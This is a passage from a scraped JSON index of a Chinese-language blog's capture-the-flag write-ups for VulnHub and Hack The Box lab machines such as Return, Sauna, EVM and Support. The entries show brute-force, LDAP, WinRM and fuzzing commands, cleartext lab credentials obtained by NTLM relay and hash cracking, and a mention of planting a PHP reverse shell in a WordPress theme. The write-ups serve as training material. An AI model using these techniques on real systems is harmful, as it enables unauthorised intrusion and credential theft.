src=\"/vulnhub_img/WEBRESOURCE981b273b7bf4971cfcee10205549815f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eSMB\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb703cf6f6f1a8f62cbdb8306d66ae87d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb73e481484e074eb57f153e54dd1d8ce%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0c9c64027ec18b85e7b1b5d1d36064c2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现密码\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEaa2775d16efd1941c7a0814f97e739d7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e发现aveng用户的账号密码\u003c/p\u003e\n\u003cp\u003eecho \u0026ldquo;user:aveng\u0026rdquo;\u003c/p\u003e\n\u003cp\u003eecho \u0026ldquo;password:kaizen+80\u0026rdquo;\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE21510db92f78eac2eb74f03d403debe2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfdd9a1ee2383c43bcc368215537e3f31%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE96a04c6fc08b449276288ec62e5ee018%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x013 WestWild-1.1"},{"content":"该靶机和靶机4问题一样，需要修改网卡配置文件才能获取到IP地址，修改方式一样\n端口扫描 web渗透 目录扫描：\nfirst_stage:flagitifyoucan1234\n尝试登录，说实话有点意外，这么简单？\n提权 看了一圈，没发现提权点，看home目录下还有一个用户，可能需要再切换一些用户?\n后面卡住没办法了，看了WP，我大概也猜到了是家目录下的图片有隐藏信息，但是这一块儿的知识确实较为欠缺。这里隐藏图片信息的获取方式：\nsteghide工具：\n提取\nsudo steghide extract -sf xxx 总结 在知道如何提取图片隐藏信息的情况下，该靶机几乎就没有难度了\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x014-mhz_cxf-c1f-/","summary":"\u003cp\u003e该靶机和靶机4问题一样，需要修改网卡配置文件才能获取到IP地址，修改方式一样\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf1d943a5f44d6ecd2daedc184efd56b2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"web渗透\"\u003eweb渗透\u003c/h1\u003e\n\u003cp\u003e目录扫描：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEbe31d832ad093168a0140649fa3c24d6%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7f713e83c70b30fa2d4cfc48a156f137%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003efirst_stage:flagitifyoucan1234\u003c/p\u003e\n\u003cp\u003e尝试登录，说实话有点意外，这么简单？\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8925d14b14e6b644806a65a2207dc24d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e看了一圈，没发现提权点，看home目录下还有一个用户，可能需要再切换一些用户?\u003c/p\u003e\n\u003cp\u003e后面卡住没办法了，看了WP，我大概也猜到了是家目录下的图片有隐藏信息，但是这一块儿的知识确实较为欠缺。这里隐藏图片信息的获取方式：\u003c/p\u003e\n\u003cp\u003esteghide工具：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2f9fc7625f157171892c98f2ebbd5849%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e提取\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esudo steghide extract -sf xxx\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcfa5c5c90d855536d043708ab9fd1fd5%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5f767ee1e5e6baa794ece946bdc70adb%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE467fab89458d0b4d9092ba6e22cf9150%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"总结\"\u003e总结\u003c/h1\u003e\n\u003cp\u003e在知道如何提取图片隐藏信息的情况下，该靶机几乎就没有难度了\u003c/p\u003e","title":"0x014 mhz_cxf c1f "},{"content":"端口扫描 获取立足点 简单看了一下端口开放情况，存在一个80 http端口，5985 winrn端口，445端口，389 ldap等。\n域名：return.local\n主机名：PRINTER\n先看445吧：\n失败，没有匿名共享\n然后看ldap有没有匿名访问：\n有，匿名访问：\n罗列用户名：\n发现没有东西：\n看来目标应该是从80端口下手了，80端口是个打印机，用户名为svc-printer，多半是主机用户名了：\n尝试进行密码爆破，失败了：\nAS-REP Roasting试一下\n失败了：\n研究一下这个打印机怎么打：\nNTLM relay:\n居然直接成功了，还抓的明文密码：\n[LDAP] Cleartext Client : 10.10.11.108\n[LDAP] Cleartext Username : return\\svc-printer\n[LDAP] Cleartext Password : 1edFg43012!!\n登录winrm，拿到flag\n使用bloodhound.py:\n分析结果，其实只能通过本地提权来进行，然后利用dcsync达到域管理员组：\n查看该成员的信息，可以发现该成员属于高价值目标组，SERVER OPERATORS@RETURN.LOCAL\nwinpe:\n改组成员可以修改服务，我们可以创建一个服务来提权：\n提权成功：\n使用mimikatz进行dcsync获取admininstrator hash:\n使用administrator登录：\n总结 这台靶机的关键点在于ntlm中继和主机提权，其实不难\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x014-return/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe382420ae6c92d98a37732267ce502eaimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEda43ac946da8dcb59c3afe808daeb124image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEbd2dd6cc4db68b83646dbf96165b441eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e简单看了一下端口开放情况，存在一个80 http端口，5985 winrn端口，445端口，389 ldap等。\u003c/p\u003e\n\u003cp\u003e域名：return.local\u003c/p\u003e\n\u003cp\u003e主机名：PRINTER\u003c/p\u003e\n\u003cp\u003e先看445吧：\u003c/p\u003e\n\u003cp\u003e失败，没有匿名共享\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEba2a5a86757af35aac982a2fdd0867e9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后看ldap有没有匿名访问：\u003c/p\u003e\n\u003cp\u003e有，匿名访问：\u003c/p\u003e\n\u003cp\u003e罗列用户名：\u003c/p\u003e\n\u003cp\u003e发现没有东西：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEfcbb23001a2bfd7fc6ae55ca963c4049image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e看来目标应该是从80端口下手了，80端口是个打印机，用户名为svc-printer，多半是主机用户名了：\u003c/p\u003e\n\u003cp\u003e尝试进行密码爆破，失败了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE4d749002945688c86db1e87c25d04735image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eAS-REP Roasting试一下\u003c/p\u003e\n\u003cp\u003e失败了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb3e47c3b025498e889b144cd31cd044bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e研究一下这个打印机怎么打：\u003c/p\u003e\n\u003cp\u003eNTLM relay:\u003c/p\u003e\n\u003cp\u003e居然直接成功了，还抓的明文密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE9a9b4e0b1a11e12d39024ea17e2b2ddbimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e[LDAP] Cleartext Client   : 10.10.11.108\u003c/p\u003e\n\u003cp\u003e[LDAP] Cleartext Username : return\\svc-printer\u003c/p\u003e\n\u003cp\u003e[LDAP] Cleartext Password : 1edFg43012!!\u003c/p\u003e\n\u003cp\u003e登录winrm，拿到flag\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE2b70a385d46e20c450d99b858254e3ffimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e使用bloodhound.py:\u003c/p\u003e\n\u003cp\u003e分析结果，其实只能通过本地提权来进行，然后利用dcsync达到域管理员组：\u003c/p\u003e\n\u003cp\u003e查看该成员的信息，可以发现该成员属于高价值目标组，SERVER \u003ca href=\"http://OPERATORS@RETURN.LOCAL\"\u003eOPERATORS@RETURN.LOCAL\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE287aadd75af37792b33b0d28e6d9cc59image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ewinpe:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE4b03948e76b801743e229db82977d14fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e改组成员可以修改服务，我们可以创建一个服务来提权：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEafd9dff26e6b60b5736c08db8187220fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e提权成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd0b0d47f3716e70a6f97c6022f336ed9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X014 Return"},{"content":"开机需要解决一下网络问题，这次是debian，配置文件为/etc/network/interface\n端口扫描： WEB渗透 打开页面提示有域名，修改hosts文件，sudocuong.com\n再扫一次：\nbG9sIHRyeSBoYXJkZXIgYnJvCg==\n可能不是密码？\n然后是logs.php，没发现什么可用信息：\n发现线索，看起来有点像base64：\n多次解码后：\n值得一提这里可以使用wfuzz把cmd使出来：\nsudo wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt -u http://sudocuong.com/workinginprogress.php?FUZZ=id \u0026ndash;hw 36\n提权 ","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x015-bossplayersctf-1/","summary":"\u003cp\u003e开机需要解决一下网络问题，这次是debian，配置文件为/etc/network/interface\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描：\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE65491538197371c76ba50372cd5caa08%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"web渗透\"\u003eWEB渗透\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb244f6293e33d32b5bd9fb119e925f7f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e打开页面提示有域名，修改hosts文件，sudocuong.com\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9b7fce60ba5dc47949aa630f1bddf3f2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e再扫一次：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc5621ff989caee27d13a5452097fb451%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ebG9sIHRyeSBoYXJkZXIgYnJvCg==\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEebd2792333eb5767cf8ac49244f17d6d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e可能不是密码？\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1383bf04463fdd72e2af4136069e29f1%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后是logs.php，没发现什么可用信息：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE45e443abea27b61380df0adc5a7f3c62%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现线索，看起来有点像base64：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1250ca566a6e5f70633be2ae65862bf8%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e多次解码后：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE27baa57e633cda4c4a6a7908a0580a2a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfe2a17c81605db7e6dd74a99e90f5d1e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe2535ab08bc2b4d8948c6a9b88690fb1%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e值得一提这里可以使用wfuzz把cmd使出来：\u003c/p\u003e\n\u003cp\u003esudo wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt -u \u003ca href=\"http://sudocuong.com/workinginprogress.php?FUZZ=id\"\u003ehttp://sudocuong.com/workinginprogress.php?FUZZ=id\u003c/a\u003e \u0026ndash;hw 36\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2cb2e270dfe2bed862f2b3985558a268%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEce43b0818634200760fd4941be3b7df9%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd60795c09ff134ad0cf4e0aab006b3e8%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x015 bossplayersCTF 1"},{"content":"端口扫描 基本信息：主机名：SAUNA，域名：EGOTISTICAL-BANK.LOCAL\n获取立足点 大致看了一下端口开放情况，主要是445\\389\\5985\\80比较关键：\n先看80：\n看样子是个金融贷款公司，可能有漏洞？\n然后是445，不存在匿名访问：\n然后是389，看看有没有匿名枚举，有的：\n试试:\n失败了：\n然后用kerbrute看看这些用户是否是可用的，发现没有可用的用户，那么只能说ldap泄露的账户不完全正确：\n那么只能试试cewl获取的信息是否正确了，有一个用户：sauna\n这个用户也失败了：\ncewl可能不太行，试试手动：\n首字母+名字\nAS-REP成功：\n破解hash:\nThestrokes23 ($krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL)\n由于5985的存在，可用winrm:\n提权 bloodhound和winpeass操作：\n疑似可以提权，但是好像没有配合的地方：\n然后看看bloodhound，不知道为什么，使用exe输出的内容无法上传分析，使用py 生成的可以：\n那么关键就是他了：\nSVC_LOANMGR\nKerberoasting失败：\n再仔细看看内容：\n原来有密码：\nDefaultDomainName : EGOTISTICALBANK\nDefaultUserName : EGOTISTICALBANK\\svc_loanmanager\nDefaultPassword : Moneymakestheworldgoround!\n我服了，这里没注意看，硬是没发现，名字不一样，我拿着上面的名字一直打，一直打不成功：\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x015-sauna/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE49ac89b8d9fc975a54b7bbd64c81db25image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEdf27ea5a3375f8849e59ef7135199357image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE9051728dcb75e68b87fda147a0f15623image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e基本信息：主机名：SAUNA，域名：EGOTISTICAL-BANK.LOCAL\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e大致看了一下端口开放情况，主要是445\\389\\5985\\80比较关键：\u003c/p\u003e\n\u003cp\u003e先看80：\u003c/p\u003e\n\u003cp\u003e看样子是个金融贷款公司，可能有漏洞？\u003c/p\u003e\n\u003cp\u003e然后是445，不存在匿名访问：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf395e6bfb4e6a5391c26bc246f0182caimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后是389，看看有没有匿名枚举，有的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe6e0627ba3dd46051579f4fd3135285cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e试试:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE43345cdd445fe6117b1b694db608d3d9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e失败了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf8a1b0a0822276cbe6ce2f1bfc8ebac3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后用kerbrute看看这些用户是否是可用的，发现没有可用的用户，那么只能说ldap泄露的账户不完全正确：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE48192919b79c49373f50b68bbcdaeeb1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e那么只能试试cewl获取的信息是否正确了，有一个用户：sauna\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEcd3e18432c5305db44589e2b48082706image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这个用户也失败了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE4d8ac5327052431929313383e3827decimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ecewl可能不太行，试试手动：\u003c/p\u003e\n\u003cp\u003e首字母+名字\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe1ed4fa76f0606bf81040ab0b065c13eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eAS-REP成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE99cb7b56363e8a08f851455e378a73aaimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e破解hash:\u003c/p\u003e\n\u003cp\u003eThestrokes23     ($krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL)\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEbf086419fe9e18a0f6e1a78b3aeab7c1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e由于5985的存在，可用winrm:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE5a8c2e2dca84e63b0034bc97d00fb825image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003ebloodhound和winpeass操作：\u003c/p\u003e\n\u003cp\u003e疑似可以提权，但是好像没有配合的地方：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEcd7c2c92a2ab22d533cbd50fb06894caimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后看看bloodhound，不知道为什么，使用exe输出的内容无法上传分析，使用py 生成的可以：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE24daefd682c0181e3f3a5c3bf89b4ae5image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e那么关键就是他了：\u003c/p\u003e\n\u003cp\u003eSVC_LOANMGR\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEdc67e192d7681daccaf2764dd61b32c1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eKerberoasting失败：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEbfa3e719d7c02949707bc314de0fa788image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e再仔细看看内容：\u003c/p\u003e\n\u003cp\u003e原来有密码：\u003c/p\u003e\n\u003cp\u003eDefaultDomainName             :  EGOTISTICALBANK\u003c/p\u003e\n\u003cp\u003eDefaultUserName               :  EGOTISTICALBANK\\svc_loanmanager\u003c/p\u003e","title":"0X015 Sauna"},{"content":"好好好，已经连着三台都需要改网卡名称了，都喜欢用\n端口扫描 渗透测试 WPscan，枚举用户：\n爆破成功：\nsudo wpscan \u0026ndash;url http://192.168.56.103/wordpress/ -P /usr/share/wordlists/rockyou.txt -U c0rrupt3d_brain\nUsername: c0rrupt3d_brain, Password: 24992499\n在编辑主题处可上传php反弹getsgell：\n此处路径为：/wordpress/wp-content/themes/twentysixteen/404.php\n提权 疑似root 密码：\n居然这么简单\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x016-evm-1/","summary":"\u003cp\u003e好好好，已经连着三台都需要改网卡名称了，都喜欢用\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEec33d9c53ab52e5d30804d0cba6b40b0%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc1f1f222621f176769defc50c753da80%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透测试\"\u003e渗透测试\u003c/h1\u003e\n\u003cp\u003eWPscan，枚举用户：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE61f70385ca0330c87143354f2299a84a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e爆破成功：\u003c/p\u003e\n\u003cp\u003esudo wpscan \u0026ndash;url \u003ca href=\"http://192.168.56.103/wordpress/\"\u003ehttp://192.168.56.103/wordpress/\u003c/a\u003e -P /usr/share/wordlists/rockyou.txt -U c0rrupt3d_brain\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEda459d388f5d071327af0d510c1224c2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eUsername: c0rrupt3d_brain, Password: 24992499\u003c/p\u003e\n\u003cp\u003e在编辑主题处可上传php反弹getsgell：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6b29a45700c218c854458b710a1cf5f2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e此处路径为：/wordpress/wp-content/themes/twentysixteen/404.php\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc48c84d9be6f694e699cec36c80cff33%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e疑似root 密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE64312b9e53bb9c56bd7c9c99f61f808e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e居然这么简单\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEeb75c202a1d743e1fe977f978573f779%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x016 EVM 1"},{"content":"端口扫描 渗透测试 没有开放HTTP协议，主要是通过域内渗透方式进行\nSMB匿名登录：\n这出现一个问题，不知到为啥，抓包看不到程序的发包\n主要考点：LDAP 轻量目录访问协议，理解上更像是一个树状图\nldapsearch似乎-h与-p结合的使用方式被停用了？，帮助里面没看到这个用法，只能用-H了，\n-x使用简单认证\n-D用户名\n-w密码\n-W交互式输入密码\n-b指定basedn查询，分辨名，唯一标识，根\nldapsearch -H ldap://10.10.11.174 -D ldap@support.htb -w \u0026#39;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz\u0026#39; -b \u0026#34;dc=support,dc=htb\u0026#34; \u0026#34;*\u0026#34; 发现密码，这里可以使用crackmapexec进行探测，这是一个用户内网渗透的探测工具：\nevil-winrm工具是 Winrm 服务利用工具，需要合法用户身份信息，使用5985端口连接：\nevil-winrm -u support -p Ironside47pleasure40Watchful -i 10.10.11.174 查看flag\n提权 BloodHound是一款用于域分析的强大工具，它可以帮助安全专业人员识别和分析Active Directory（AD）环境中的攻击路径和权限问题。本文将介绍BloodHound的基本概念，并提供一些使用BloodHound进行域分析的编程实例。\nBloodHound的使用：\n启动：\n1、开启neo4j数据库：\rneo4j start\r访问本地的7474端口即可看到web页面，默认账密：neo4j，第一次使用需要修改密码\r2、kali启动BloodHound：\r./BloodHound --no-sandbox 离线脚本使用：\n1、上传windows版本的脚本，存放在以下路径：\rBloodHound-linux-x64/resources/app/Collectors\r2、运行即可\rSharpHound.exe -c all 